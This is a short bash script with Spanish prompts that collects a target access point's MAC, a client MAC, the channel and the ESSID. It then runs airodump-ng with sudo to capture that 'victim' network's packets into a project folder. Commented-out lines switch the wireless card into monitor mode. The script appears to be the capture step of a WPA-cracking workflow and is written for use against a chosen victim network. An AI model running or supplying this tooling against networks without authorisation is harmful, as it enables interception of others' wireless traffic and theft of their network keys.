#!/bin/bash

#sudo airmon-ng stop `cat wlan`
#sudo airmon-ng stop `cat mon`

read -p "Canal?: " ch

#sudo ifconfig `cat wlan` down
#sudo iwconfig `cat wlan` mode managed
#sudo iwconfig `cat wlan` channel $ch
#sudo iwconfig `cat wlan` mode monitor
#sudo ifconfig `cat wlan` up
#sudo airmon-ng start `cat wlan` $ch


read -p "Mac victima?: " macv
read -p "Mac cliente (solo wpa): " macc
read -p "Nombre del proyecto?: " archivo
read -p "Nombre AP Victima?: " essid

mkdir $archivo
cd $archivo
echo $macc > cbssid
echo $macv > bssid
echo $essid > essid

sudo airodump-ng -a -c $ch --bssid `cat bssid` -w $archivo `cat ../mon`
cd ..
echo Paquetes guardados en la carpeta $archivo
